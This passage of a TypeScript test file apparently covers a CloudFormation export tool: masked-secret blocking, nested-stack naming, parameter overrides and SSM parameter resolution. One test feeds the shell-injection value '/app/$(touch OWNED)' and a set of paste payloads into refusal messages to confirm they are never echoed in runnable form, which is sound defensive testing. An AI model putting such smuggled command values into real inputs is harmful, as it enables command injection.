    state.resources['Ud']!.properties = { Name: '/app/ud', Type: 'String', Value: '***' };
    const template = {
      Resources: {
        Ud: { Type: 'AWS::SSM::Parameter', Properties: { Name: '/app/ud', Value: 'x' } },
      },
    };

    const result = await buildImportPlan(state, template, cfnClientStub, 'Root');

    expect(result.blocked).toHaveLength(1);
    const reason = result.blocked[0]!.reason;
    expect(reason).toMatch(/three ways a record comes to hold it/);
    expect(reason).toMatch(/\(2\) The Fn::Base64 encoding of a secret value/);
    expect(reason).toMatch(/re-deploying the same template does not clear this/);
    expect(reason).toMatch(/Stop encoding the secret into the property/);
    // The remedy must not read as "inline the plaintext", which would clear
    // the block by persisting the secret in the clear.
    expect(reason).toMatch(/not by writing the secret's plaintext into the template/);
    // The other two arms are still named, so the Base64 arm was added, not
    // substituted.
    expect(reason).toMatch(/\(1\) A NoEcho custom-resource value/);
    expect(reason).toMatch(/\(3\) The value was SPLICED from a masked record of ANOTHER resource/);
    expect(reason).not.toMatch(/two ways/);
  });

  it('does NOT block an ordinary resource whose properties carry no mask', async () => {
    // The negative control: without it the case above would pass just as well
    // if the guard blocked everything.
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: { Param: { resourceType: 'AWS::SSM::Parameter' } },
    });
    state.resources['Param']!.properties = { Name: '/app/token', Value: 'ordinary' };
    const template = {
      Resources: {
        Param: { Type: 'AWS::SSM::Parameter', Properties: { Name: '/app/token', Value: 'x' } },
      },
    };

    const result = await buildImportPlan(state, template, cfnClientStub, 'Root');

    expect(result.blocked).toEqual([]);
  });

  it('routes AWS::CloudFormation::Stack rows into nestedStackRows[] (not blocked)', async () => {
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: {
        Child: { resourceType: 'AWS::CloudFormation::Stack' },
      },
    });
    const template = {
      Resources: {
        Child: { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'x' } },
      },
    };
    const result = await buildImportPlan(state, template, cfnClientStub, 'Root');
    expect(result.nestedStackRows).toEqual([{ logicalId: 'Child', childStackName: 'Root~Child' }]);
    expect(result.blocked).toEqual([]);
    expect(result.phase1Imports).toEqual([]);
  });

  it('derives childStackName via `<parent>~<logicalId>` (the v6 state-key shape)', async () => {
    const state = makeState({
      stackName: 'MyApp',
      region: 'us-east-1',
      resources: {
        Database: { resourceType: 'AWS::CloudFormation::Stack' },
        Frontend: { resourceType: 'AWS::CloudFormation::Stack' },
      },
    });
    const template = {
      Resources: {
        Database: { Type: 'AWS::CloudFormation::Stack', Properties: {} },
        Frontend: { Type: 'AWS::CloudFormation::Stack', Properties: {} },
      },
    };
    const result = await buildImportPlan(state, template, cfnClientStub, 'MyApp');
    expect(result.nestedStackRows.map((r) => r.childStackName).sort()).toEqual([
      'MyApp~Database',
      'MyApp~Frontend',
    ]);
  });

  it('blocks when the template has a nested-stack row but state has no matching entry', async () => {
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      // No Child entry in state — parent state is torn.
      resources: {},
    });
    const template = {
      Resources: {
        Child: { Type: 'AWS::CloudFormation::Stack', Properties: {} },
      },
    };
    const result = await buildImportPlan(state, template, cfnClientStub, 'Root');
    expect(result.nestedStackRows).toEqual([]);
    expect(result.blocked).toHaveLength(1);
    expect(result.blocked[0]!.logicalId).toBe('Child');
    expect(result.blocked[0]!.reason).toMatch(/no matching nested-stack entry on parent 'Root'/);
  });

  it('blocks when the state row exists but is the wrong resource type (sanity check)', async () => {
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      // Wrong type — should not be matched as a nested-stack row.
      resources: { Child: { resourceType: 'AWS::S3::Bucket' } },
    });
    const template = {
      Resources: {
        Child: { Type: 'AWS::CloudFormation::Stack', Properties: {} },
      },
    };
    const result = await buildImportPlan(state, template, cfnClientStub, 'Root');
    expect(result.nestedStackRows).toEqual([]);
    expect(result.blocked).toHaveLength(1);
    expect(result.blocked[0]!.reason).toMatch(/no matching nested-stack entry/);
  });

  it('classifies a mixed template (one phase-1 row + one nested-stack row) without crosstalk', async () => {
    // Verifies the two branches coexist in a single buildImportPlan run:
    // a regular importable resource lands in `phase1Imports` while a
    // sibling AWS::CloudFormation::Stack row lands in `nestedStackRows`.
    // The cfn-client mock must NOT throw for the bucket's identifier
    // lookup — override the stub so `DescribeType` returns a schema.
    const state = makeState({
      stackName: 'Root',
      region: 'us-east-1',
      resources: {
        Bucket: { resourceType: 'AWS::S3::Bucket', physicalId: 'my-bucket-123' },
        Child: { resourceType: 'AWS::CloudFormation::Stack' },
      },
    });
    const template = {
      Resources: {
        Bucket: { Type: 'AWS::S3::Bucket', Properties: { BucketName: 'my-bucket-123' } },
        Child: { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'x' } },
      },
    };
    // Stubbed `send` only fires for the Bucket's DescribeType lookup; the
    // nested-stack row short-circuits BEFORE identifier resolution. Return
    // a schema that resolves AWS::S3::Bucket via the PRIMARY_IDENTIFIER_FALLBACK
    // path (i.e. throw to force fallback to the BucketName entry).
    const cfnClient = {
      send: async () => {
        throw new Error('DescribeType simulated failure — falls back to PRIMARY_IDENTIFIER_FALLBACK');
      },
    } as unknown as AwsClients['cloudFormation'];
    const result = await buildImportPlan(state, template, cfnClient, 'Root');
    expect(result.phase1Imports).toHaveLength(1);
    expect(result.phase1Imports[0]!.logicalId).toBe('Bucket');
    expect(result.phase1Imports[0]!.resourceIdentifier).toEqual({ BucketName: 'my-bucket-123' });
    expect(result.nestedStackRows).toEqual([
      { logicalId: 'Child', childStackName: 'Root~Child' },
    ]);
    expect(result.blocked).toEqual([]);
  });
});

// -----------------------------------------------------------------------------
// Issue #464 PR B2 — `cdkd export` per-stack IMPORT loop helpers.
// PR B2 ships the full cdkd → CFn migration for nested-stack trees. These
// tests cover the small, pure helpers underpinning the orchestrator. The
// orchestrator itself (`runPerStackImportLoop`) is exercised in
// `export-nested-loop.test.ts` (separate file so AWS SDK + uploadCfnTemplate
// vi.mocks don't leak into the rest of export.test.ts).
// -----------------------------------------------------------------------------

describe('cdkd2cfnStackName (issue #464 PR B2)', () => {
  it('passes through CFn-compatible stack names', () => {
    expect(cdkd2cfnStackName('MyApp')).toBe('MyApp');
    expect(cdkd2cfnStackName('My-App-Stack')).toBe('My-App-Stack');
    expect(cdkd2cfnStackName('Root123')).toBe('Root123');
  });

  it("substitutes '~' with '-' for the v6 nested-child name shape", () => {
    expect(cdkd2cfnStackName('Root~Child')).toBe('Root-Child');
    expect(cdkd2cfnStackName('Root~Child~Grandchild')).toBe('Root-Child-Grandchild');
  });

  it('handles every cdkd state-key form the v6 schema produces', () => {
    // Mixed-case + digits + hyphens already in the cdkd name. The mapping
    // should only touch `~` — everything else passes through.
    expect(cdkd2cfnStackName('MyApp-Prod~Database123')).toBe('MyApp-Prod-Database123');
  });

  it('throws when the mapped name violates the CFn stack-name constraint (#589 Nit 1)', () => {
    // The `~` → `-` swap does not rescue a name that is otherwise illegal:
    // leading underscore / digit, or an embedded '.' / '/'. These would
    // otherwise surface as an opaque CFn API rejection deep in the IMPORT
    // loop — fail fast at the mapping with a pointer at the override flags.
    expect(() => cdkd2cfnStackName('_foo')).toThrow(/violates the CloudFormation stack-name/);
    expect(() => cdkd2cfnStackName('1foo')).toThrow(/violates the CloudFormation stack-name/);
    expect(() => cdkd2cfnStackName('foo.bar')).toThrow(/violates the CloudFormation stack-name/);
    expect(() => cdkd2cfnStackName('foo/bar')).toThrow(/violates the CloudFormation stack-name/);
    // A `~`-bearing name whose non-separator characters are otherwise illegal
    // still throws after the substitution (`_db` stays illegal).
    expect(() => cdkd2cfnStackName('MyApp~_db')).toThrow(/violates the CloudFormation stack-name/);
  });

  it('error message points at the override escape hatch (#589 Nit 1)', () => {
    expect(() => cdkd2cfnStackName('_foo')).toThrow(/--cfn-stack-name/);
    expect(() => cdkd2cfnStackName('_foo')).toThrow(/--cfn-child-stack-name/);
  });
});

describe('parseCfnChildStackNameOverrides (issue #464 PR B2)', () => {
  it('returns an empty map when the flag is unset', () => {
    expect(parseCfnChildStackNameOverrides(undefined).size).toBe(0);
    expect(parseCfnChildStackNameOverrides([]).size).toBe(0);
  });

  it('parses a single override', () => {
    const map = parseCfnChildStackNameOverrides(['MyApp~Database=my-app-db']);
    expect(map.get('MyApp~Database')).toBe('my-app-db');
    expect(map.size).toBe(1);
  });

  it('parses multiple overrides', () => {
    const map = parseCfnChildStackNameOverrides([
      'MyApp~DatabaseA=my-app-db-a',
      'MyApp~DatabaseB=my-app-db-b',
    ]);
    expect(map.get('MyApp~DatabaseA')).toBe('my-app-db-a');
    expect(map.get('MyApp~DatabaseB')).toBe('my-app-db-b');
  });

  it("rejects entries without '='", () => {
    expect(() => parseCfnChildStackNameOverrides(['MyApp~Database'])).toThrow(
      /not in '<cdkdName>=<cfnName>' form/
    );
  });

  it('rejects empty cdkdName', () => {
    expect(() => parseCfnChildStackNameOverrides(['=foo'])).toThrow(
      /empty cdkd stack name/
    );
  });

  it('rejects empty cfnName', () => {
    expect(() => parseCfnChildStackNameOverrides(['MyApp~Database='])).toThrow(
      /empty CFn stack name/
    );
  });

  it('rejects CFn names that violate the CFn naming constraint', () => {
    // CFn stack names must match [a-zA-Z][-a-zA-Z0-9]* — no '~', '_', '.', '/'.
    expect(() => parseCfnChildStackNameOverrides(['x=MyApp_Database'])).toThrow(
      /must match \[a-zA-Z\]/
    );
    expect(() => parseCfnChildStackNameOverrides(['x=MyApp.Database'])).toThrow(
      /must match \[a-zA-Z\]/
    );
    expect(() => parseCfnChildStackNameOverrides(['x=MyApp~Database'])).toThrow(
      /must match \[a-zA-Z\]/
    );
    expect(() => parseCfnChildStackNameOverrides(['x=1MyApp'])).toThrow(
      /must match \[a-zA-Z\]/
    );
  });

  it('rejects duplicate cdkdName keys (no silent last-wins)', () => {
    expect(() =>
      parseCfnChildStackNameOverrides(['MyApp~Db=a', 'MyApp~Db=b'])
    ).toThrow(/duplicate override for cdkd stack 'MyApp~Db'/);
  });
});

describe('extractChildImportParameters (issue #464 PR B2)', () => {
  it('returns empty when the parent has no nested-stack row', () => {
    const parentTemplate = { Resources: {} };
    const result = extractChildImportParameters(parentTemplate, 'Child');
    expect(result.params).toEqual([]);
    expect(result.intrinsicSkipped).toEqual([]);
  });

  it("returns empty when the row has no Properties.Parameters", () => {
    const parentTemplate = {
      Resources: {
        Child: { Type: 'AWS::CloudFormation::Stack', Properties: {} },
      },
    };
    expect(extractChildImportParameters(parentTemplate, 'Child').params).toEqual([]);
  });

  it('forwards literal-string Parameter values', () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: {
            Parameters: { Env: 'prod', Region: 'us-east-1' },
          },
        },
      },
    };
    const result = extractChildImportParameters(parentTemplate, 'Child');
    expect(result.params).toEqual([
      { ParameterKey: 'Env', ParameterValue: 'prod' },
      { ParameterKey: 'Region', ParameterValue: 'us-east-1' },
    ]);
    expect(result.intrinsicSkipped).toEqual([]);
  });

  it('coerces numbers and booleans to strings', () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: { Parameters: { Count: 42, Enabled: true } },
        },
      },
    };
    const result = extractChildImportParameters(parentTemplate, 'Child');
    expect(result.params).toEqual([
      { ParameterKey: 'Count', ParameterValue: '42' },
      { ParameterKey: 'Enabled', ParameterValue: 'true' },
    ]);
  });

  it('skips intrinsic-valued Parameters with a warning list', () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: {
            Parameters: {
              Literal: 'hello',
              FromRef: { Ref: 'OtherParam' },
              FromGetAtt: { 'Fn::GetAtt': ['OtherResource', 'Arn'] },
            },
          },
        },
      },
    };
    const result = extractChildImportParameters(parentTemplate, 'Child');
    expect(result.params).toEqual([{ ParameterKey: 'Literal', ParameterValue: 'hello' }]);
    expect(result.intrinsicSkipped).toEqual(['FromRef', 'FromGetAtt']);
  });

  it('tolerates malformed Properties.Parameters (Array / null)', () => {
    expect(
      extractChildImportParameters(
        { Resources: { Child: { Type: 'X', Properties: { Parameters: null } } } },
        'Child'
      ).params
    ).toEqual([]);
    expect(
      extractChildImportParameters(
        { Resources: { Child: { Type: 'X', Properties: { Parameters: [] } } } },
        'Child'
      ).params
    ).toEqual([]);
  });
});

describe('flattenCdkdStateTreeRootFirst (issue #464 follow-up)', () => {
  function leaf(stackName: string): CdkdStateStackTree {
    return {
      stackName,
      region: 'us-east-1',
      state: {} as StackState,
      nestedChildren: new Map(),
    };
  }

  it('visits parent before children (inverse of leaf-first)', () => {
    const grandchild = leaf('Root~Middle~Grandchild');
    const middle: CdkdStateStackTree = {
      ...leaf('Root~Middle'),
      nestedChildren: new Map([['Grandchild', grandchild]]),
    };
    const root: CdkdStateStackTree = {
      ...leaf('Root'),
      nestedChildren: new Map([['Middle', middle]]),
    };
    expect(flattenCdkdStateTreeRootFirst(root).map((n) => n.stackName)).toEqual([
      'Root',
      'Root~Middle',
      'Root~Middle~Grandchild',
    ]);
    // Sanity: it is the exact reverse-ish of leaf-first for this linear tree.
    expect(flattenCdkdStateTreeLeafFirst(root).map((n) => n.stackName)).toEqual([
      'Root~Middle~Grandchild',
      'Root~Middle',
      'Root',
    ]);
  });
});

describe('resolveChildImportParameters (issue #464 follow-up — intrinsic Parameter resolution)', () => {
  const resolver = new IntrinsicFunctionResolver('us-east-1');

  function parentCtx(overrides?: Partial<ResolverContext>): ResolverContext {
    return {
      template: { Resources: {} } as unknown as ResolverContext['template'],
      resources: {},
      parameters: {},
      stackName: 'Root',
      ...overrides,
    };
  }

  it('passes literals through unchanged (no resolver work needed)', async () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: { Parameters: { Env: 'prod', Count: 3 } },
        },
      },
    };
    const result = await resolveChildImportParameters(
      parentTemplate,
      parentCtx(),
      'Child',
      resolver
    );
    expect(result.params).toEqual([
      { ParameterKey: 'Env', ParameterValue: 'prod' },
      { ParameterKey: 'Count', ParameterValue: '3' },
    ]);
    expect(result.intrinsicSkipped).toEqual([]);
  });

  it('resolves {Ref: ParentParam} against the parent resolved Parameters', async () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: { Parameters: { Stage: { Ref: 'StageParam' } } },
        },
      },
    };
    const result = await resolveChildImportParameters(
      parentTemplate,
      parentCtx({ parameters: { StageParam: 'production' } }),
      'Child',
      resolver
    );
    expect(result.params).toEqual([{ ParameterKey: 'Stage', ParameterValue: 'production' }]);
    expect(result.intrinsicSkipped).toEqual([]);
  });

  it('resolves {Fn::GetAtt: [ParentResource, Attr]} against the parent state attributes', async () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: { Parameters: { TableArn: { 'Fn::GetAtt': ['MyTable', 'Arn'] } } },
        },
      },
    };
    const result = await resolveChildImportParameters(
      parentTemplate,
      parentCtx({
        resources: {
          MyTable: {
            physicalId: 'my-table',
            resourceType: 'AWS::DynamoDB::Table',
            properties: {},
            attributes: { Arn: 'arn:aws:dynamodb:us-east-1:123:table/my-table' },
            dependencies: [],
          },
        },
      }),
      'Child',
      resolver
    );
    expect(result.params).toEqual([
      { ParameterKey: 'TableArn', ParameterValue: 'arn:aws:dynamodb:us-east-1:123:table/my-table' },
    ]);
    expect(result.intrinsicSkipped).toEqual([]);
  });

  it('falls back to intrinsicSkipped when the resolver cannot resolve (Ref to unknown)', async () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: {
            Parameters: { Good: 'literal', Bad: { Ref: 'NoSuchParamOrResource' } },
          },
        },
      },
    };
    const result = await resolveChildImportParameters(
      parentTemplate,
      parentCtx(),
      'Child',
      resolver
    );
    // The literal still forwards; the unresolvable Ref degrades to skipped.
    expect(result.params).toEqual([{ ParameterKey: 'Good', ParameterValue: 'literal' }]);
    expect(result.intrinsicSkipped).toEqual(['Bad']);
  });

  it('mixes resolved + unresolvable in one block', async () => {
    const parentTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: {
            Parameters: {
              FromRef: { Ref: 'KnownParam' },
              FromBadGetAtt: { 'Fn::GetAtt': ['NoSuchResource', 'Arn'] },
            },
          },
        },
      },
    };
    const result = await resolveChildImportParameters(
      parentTemplate,
      parentCtx({ parameters: { KnownParam: 'v1' } }),
      'Child',
      resolver
    );
    expect(result.params).toEqual([{ ParameterKey: 'FromRef', ParameterValue: 'v1' }]);
    expect(result.intrinsicSkipped).toEqual(['FromBadGetAtt']);
  });
});

describe('buildResolvedParametersPerStack (issue #464 follow-up — root-first pre-pass)', () => {
  const resolver = new IntrinsicFunctionResolver('us-east-1');

  function node(
    cdkdName: string,
    template: Record<string, unknown>,
    parent?: { stack: string; logicalId: string }
  ): { cdkdName: string; template: Record<string, unknown>; state: StackState } {
    const state = {
      version: 6,
      stackName: cdkdName,
      region: 'us-east-1',
      resources: {},
      outputs: {},
      lastModified: 0,
      ...(parent && {
        parentStack: parent.stack,
        parentLogicalId: parent.logicalId,
        parentRegion: 'us-east-1',
      }),
    } as StackState;
    return { cdkdName, template, state };
  }

  function treeNode(stackName: string, children: Map<string, CdkdStateStackTree>): CdkdStateStackTree {
    return { stackName, region: 'us-east-1', state: {} as StackState, nestedChildren: children };
  }

  it('resolves a 3-level Ref chain root -> middle -> grandchild', async () => {
    // Root passes its `Stage` param down to Middle (logical id `Middle`);
    // Middle passes the same down to Grandchild (logical id `Grandchild`).
    const rootTemplate = {
      Resources: {
        Middle: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: { Parameters: { Stage: { Ref: 'StageParam' } } },
        },
      },
    };
    const middleTemplate = {
      Resources: {
        Grandchild: {
          Type: 'AWS::CloudFormation::Stack',
          // Middle forwards its own `Stage` param (a Parameter of Middle's
          // template) down to the grandchild.
          Properties: { Parameters: { Stage: { Ref: 'Stage' } } },
        },
      },
    };
    const grandchildTemplate = { Resources: {} };

    const tree = treeNode(
      'Root',
      new Map([
        [
          'Middle',
          treeNode(
            'Root~Middle',
            new Map([['Grandchild', treeNode('Root~Middle~Grandchild', new Map())]])
          ),
        ],
      ])
    );

    const { paramsByCdkdName, intrinsicSkippedByCdkdName } = await buildResolvedParametersPerStack({
      rootStackName: 'Root',
      rootParameters: [{ ParameterKey: 'StageParam', ParameterValue: 'prod' }],
      perStackNodes: [
        node('Root', rootTemplate),
        node('Root~Middle', middleTemplate, { stack: 'Root', logicalId: 'Middle' }),
        node('Root~Middle~Grandchild', grandchildTemplate, {
          stack: 'Root~Middle',
          logicalId: 'Grandchild',
        }),
      ],
      tree,
      resolver,
    });

    // Root submits its CLI params verbatim.
    expect(paramsByCdkdName.get('Root')).toEqual([
      { ParameterKey: 'StageParam', ParameterValue: 'prod' },
    ]);
    // Middle's `Stage` resolves from Root's `StageParam` = 'prod'.
    expect(paramsByCdkdName.get('Root~Middle')).toEqual([
      { ParameterKey: 'Stage', ParameterValue: 'prod' },
    ]);
    // Grandchild's `Stage` resolves from Middle's resolved `Stage` = 'prod'
    // (the transitive chain — proves root-first ordering is load-bearing).
    expect(paramsByCdkdName.get('Root~Middle~Grandchild')).toEqual([
      { ParameterKey: 'Stage', ParameterValue: 'prod' },
    ]);
    expect(intrinsicSkippedByCdkdName.size).toBe(0);
  });

  describe('an SSM-typed parent Parameter passed to a child (go-to-k/cdkd#3915)', () => {
    const rootWith = (type: string, childParams: Record<string, unknown>) => ({
      Parameters: { RootRole: { Type: type } },
      Resources: {
        Child: { Type: 'AWS::CloudFormation::Stack', Properties: { Parameters: childParams } },
      },
    });
    const tree = () => treeNode('Root', new Map([['Child', treeNode('Root~Child', new Map())]]));
    const run = (
      rootTemplate: Record<string, unknown>,
      readSsmParameter?: (name: string) => Promise<{ value: string; type?: string }>
    ) =>
      buildResolvedParametersPerStack({
        rootStackName: 'Root',
        rootParameters: [{ ParameterKey: 'RootRole', ParameterValue: '/app/role-name' }],
        perStackNodes: [
          node('Root', rootTemplate),
          node('Root~Child', { Resources: {} }, { stack: 'Root', logicalId: 'Child' }),
        ],
        tree: tree(),
        resolver,
        ...(readSsmParameter && { readSsmParameter }),
      });

    it('hands the child the stored value, and the root keeps submitting the SSM name', async () => {
      const read = vi.fn(async () => ({ value: 'RealRole', type: 'String' }));
      const { paramsByCdkdName } = await run(
        rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } }),
        read
      );
      expect(read.mock.calls).toEqual([['/app/role-name']]);
      expect(paramsByCdkdName.get('Root~Child')).toEqual([
        { ParameterKey: 'RoleParam', ParameterValue: 'RealRole' },
      ]);
      expect(paramsByCdkdName.get('Root')).toEqual([
        { ParameterKey: 'RootRole', ParameterValue: '/app/role-name' },
      ]);
    });

    it('makes a list-typed SSM parameter a list to Fn::Join and Fn::Select in the row', async () => {
      const read = vi.fn(async () => ({ value: 'a, b,c', type: 'StringList' }));
      for (const type of [
        'AWS::SSM::Parameter::Value<List<String>>',
        'AWS::SSM::Parameter::Value<CommaDelimitedList>',
      ]) {
        const { paramsByCdkdName } = await run(
          rootWith(type, {
            Joined: { 'Fn::Join': ['|', { Ref: 'RootRole' }] },
            Second: { 'Fn::Select': [1, { Ref: 'RootRole' }] },
          }),
          read
        );
        expect(paramsByCdkdName.get('Root~Child')).toEqual([
          { ParameterKey: 'Joined', ParameterValue: 'a|b|c' },
          { ParameterKey: 'Second', ParameterValue: 'b' },
        ]);
      }
    });

    it('hands a list-typed SSM parameter over as its comma-joined value', async () => {
      const read = vi.fn(async () => ({ value: 'a,b', type: 'StringList' }));
      for (const type of [
        'AWS::SSM::Parameter::Value<List<String>>',
        'AWS::SSM::Parameter::Value<CommaDelimitedList>',
      ]) {
        const { paramsByCdkdName } = await run(rootWith(type, { Names: { Ref: 'RootRole' } }), read);
        expect(paramsByCdkdName.get('Root~Child')).toEqual([
          { ParameterKey: 'Names', ParameterValue: 'a,b' },
        ]);
      }
    });

    it('resolves a Fn::Sub mention too', async () => {
      const read = vi.fn(async () => ({ value: 'RealRole', type: 'String' }));
      const { paramsByCdkdName } = await run(
        rootWith('AWS::SSM::Parameter::Value<String>', {
          RoleArn: { 'Fn::Sub': 'arn:aws:iam::1:role/${RootRole}' },
        }),
        read
      );
      expect(paramsByCdkdName.get('Root~Child')).toEqual([
        { ParameterKey: 'RoleArn', ParameterValue: 'arn:aws:iam::1:role/RealRole' },
      ]);
    });

    it('reads nothing for a plain String parameter or one the row does not mention', async () => {
      const read = vi.fn(async () => ({ value: 'never' }));
      const plain = await run(rootWith('String', { RoleParam: { Ref: 'RootRole' } }), read);
      expect(plain.paramsByCdkdName.get('Root~Child')).toEqual([
        { ParameterKey: 'RoleParam', ParameterValue: '/app/role-name' },
      ]);
      await run(rootWith('AWS::SSM::Parameter::Value<String>', { Other: 'literal' }), read);
      expect(read).not.toHaveBeenCalled();
    });

    it('refuses, naming the parameter and the permission, when the read fails', async () => {
      const read = vi.fn(async () => {
        throw Object.assign(new Error('Parameter /app/role-name not found'), {
          name: 'ParameterNotFound',
        });
      });
      await expect(
        run(rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } }), read)
      ).rejects.toThrow(
        /SSM parameter \/app\/role-name.*read failed \(ParameterNotFound\).*ssm:GetParameter.*for 'RootRole' with '--parameter <Key>=<Name>'/s
      );
    });

    it('names the two stacks only when plain, and no pasted span of the refusal runs (go-to-k/cdkd#3950)', async () => {
      const refusalFor = async (
        rootName: string,
        ssmName = '/app/role-name',
        readSsmParameter?: (name: string) => Promise<{ value: string; type?: string }>
      ): Promise<string> => {
        const err = await buildResolvedParametersPerStack({
          rootStackName: rootName,
          rootParameters: [{ ParameterKey: 'RootRole', ParameterValue: ssmName }],
          perStackNodes: [
            node(rootName, rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } })),
            node(`${rootName}~Child`, { Resources: {} }, { stack: rootName, logicalId: 'Child' }),
          ],
          tree: treeNode(rootName, new Map([['Child', treeNode(`${rootName}~Child`, new Map())]])),
          resolver,
          ...(readSsmParameter && { readSsmParameter }),
        }).then(
          () => undefined,
          (e: unknown) => e as Error
        );
        expect(err, `no refusal for ${rootName}`).toBeDefined();
        return err!.message;
      };
      expect(await refusalFor('Plain1')).toContain(
        "Stack 'Plain1' passes its SSM-typed Parameter 'RootRole' (SSM parameter /app/role-name) to " +
          "nested stack 'Plain1~Child'."
      );
      const messages: Array<{ value: string; message: string }> = [];
      for (const { value } of PASTE_PAYLOADS) messages.push({ value, message: await refusalFor(value) });
      // R3 of the go-to-k/cdkd#4245 review: the SSM parameter NAME is the
      // parent template's value, inside a refusal that ends on a `--parameter`
      // remedy, so a non-inert one is described, never JSON-quoted.
      const ssmMessages: Array<{ value: string; message: string }> = [];
      const readFails = async (): Promise<{ value: string }> => {
        throw Object.assign(new Error('denied'), { name: 'AccessDeniedException' });
      };
      for (const { value } of [...PASTE_PAYLOADS, { value: '/app/$(touch OWNED)' }]) {
        ssmMessages.push({ value, message: await refusalFor('Plain1', value) });
        // The READ-FAILED arm: the one that ends on the `--parameter` remedy
        // (security review of go-to-k/cdkd#4245, round 5).
        const failed = await refusalFor('Plain1', value, readFails);
        expect(failed, value).toContain("with '--parameter <Key>=<Name>', and re-run.");
        ssmMessages.push({ value, message: failed });
      }
      withPasteDir((dir) => {
        for (const { value, message } of ssmMessages) {
          expect(message, value).toContain(
            '(SSM parameter (not shown: it is not a plain identifier)) to nested stack'
          );
          expect(message, value).not.toContain(value);
          expect(spansThatRun(message, dir), value).toEqual([]);
        }
        for (const { value, message } of messages) {
          expect(message, value).toContain(
            'Stack (not shown: it is not a plain identifier) passes its SSM-typed Parameter'
          );
          expect(message, value).toContain('to nested stack (not shown: it is not a plain identifier).');
          expect(message, value).not.toContain(value);
          expect(spansThatRun(message, dir), value).toEqual([]);
        }
      });
    }, 120_000);

    it('refuses without a reader rather than handing the child the SSM name', async () => {
      await expect(
        run(rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } }))
      ).rejects.toThrow('No SSM client was available to read it.');
    });

    it('reads through ssm:GetParameter without decryption, and refuses a missing value', async () => {
      const send = vi.fn(async (_cmd: unknown) => ({ Parameter: { Value: 'v', Type: 'StringList' } }));
      const read = ssmParameterReader({ send } as unknown as AwsClients['ssm']);
      expect(await read('/p')).toEqual({ value: 'v', type: 'StringList' });
      expect((send.mock.calls[0]![0] as { input: unknown }).input).toEqual({
        Name: '/p',
        WithDecryption: false,
      });
      send.mockImplementationOnce(async () => ({ Parameter: {} }) as never);
      await expect(read('/p')).rejects.toMatchObject({ name: 'NoValue' });
    });

    it('refuses a value whose type is not reported (fails closed)', async () => {
      const read = vi.fn(async () => ({ value: 'x' }));
      await expect(
        run(rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } }), read)
      ).rejects.toThrow('Its type is not reported, not String or StringList');
    });

    it('refuses a reader that throws synchronously the same way', async () => {
      const read = vi.fn(() => {
        throw Object.assign(new Error('boom'), { name: 'SyncFailure' });
      });
      await expect(
        run(rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } }), read)
      ).rejects.toThrow('read failed (SyncFailure)');
    });

    it('reads one SSM name once per run, however many children it is passed to', async () => {
      const read = vi.fn(async () => ({ value: 'RealRole', type: 'String' }));
      const rootTemplate = {
        Parameters: { RootRole: { Type: 'AWS::SSM::Parameter::Value<String>' } },
        Resources: {
          A: { Type: 'AWS::CloudFormation::Stack', Properties: { Parameters: { R: { Ref: 'RootRole' } } } },
          B: { Type: 'AWS::CloudFormation::Stack', Properties: { Parameters: { R: { Ref: 'RootRole' } } } },
        },
      };
      const { paramsByCdkdName } = await buildResolvedParametersPerStack({
        rootStackName: 'Root',
        rootParameters: [{ ParameterKey: 'RootRole', ParameterValue: '/app/role-name' }],
        perStackNodes: [
          node('Root', rootTemplate),
          node('Root~A', { Resources: {} }, { stack: 'Root', logicalId: 'A' }),
          node('Root~B', { Resources: {} }, { stack: 'Root', logicalId: 'B' }),
        ],
        tree: treeNode(
          'Root',
          new Map([
            ['A', treeNode('Root~A', new Map())],
            ['B', treeNode('Root~B', new Map())],
          ])
        ),
        resolver,
        readSsmParameter: read,
      });
      expect(read).toHaveBeenCalledTimes(1);
      expect(paramsByCdkdName.get('Root~A')).toEqual([{ ParameterKey: 'R', ParameterValue: 'RealRole' }]);
      expect(paramsByCdkdName.get('Root~B')).toEqual([{ ParameterKey: 'R', ParameterValue: 'RealRole' }]);
    });

    describe('a middle stack', () => {
      // Root -> Middle (row `Middle`) -> Leaf (row `Leaf`).
      const threeLevel = (
        middleParamType: string,
        rootRow: Record<string, unknown>,
        read: (name: string) => Promise<{ value: string; type?: string }>
      ) =>
        buildResolvedParametersPerStack({
          rootStackName: 'Root',
          rootParameters: [{ ParameterKey: 'RootRole', ParameterValue: '/app/role-name' }],
          perStackNodes: [
            node('Root', {
              Parameters: { RootRole: { Type: 'AWS::SSM::Parameter::Value<String>' } },
              Resources: {
                Middle: { Type: 'AWS::CloudFormation::Stack', Properties: { Parameters: rootRow } },
              },
            }),
            node(
              'Root~Middle',
              {
                Parameters: { MidParam: { Type: middleParamType } },
                Resources: {
                  Leaf: {
                    Type: 'AWS::CloudFormation::Stack',
                    Properties: { Parameters: { LeafParam: { Ref: 'MidParam' } } },
                  },
                },
              },
              { stack: 'Root', logicalId: 'Middle' }
            ),
            node('Root~Middle~Leaf', { Resources: {} }, { stack: 'Root~Middle', logicalId: 'Leaf' }),
          ],
          tree: treeNode(
            'Root',
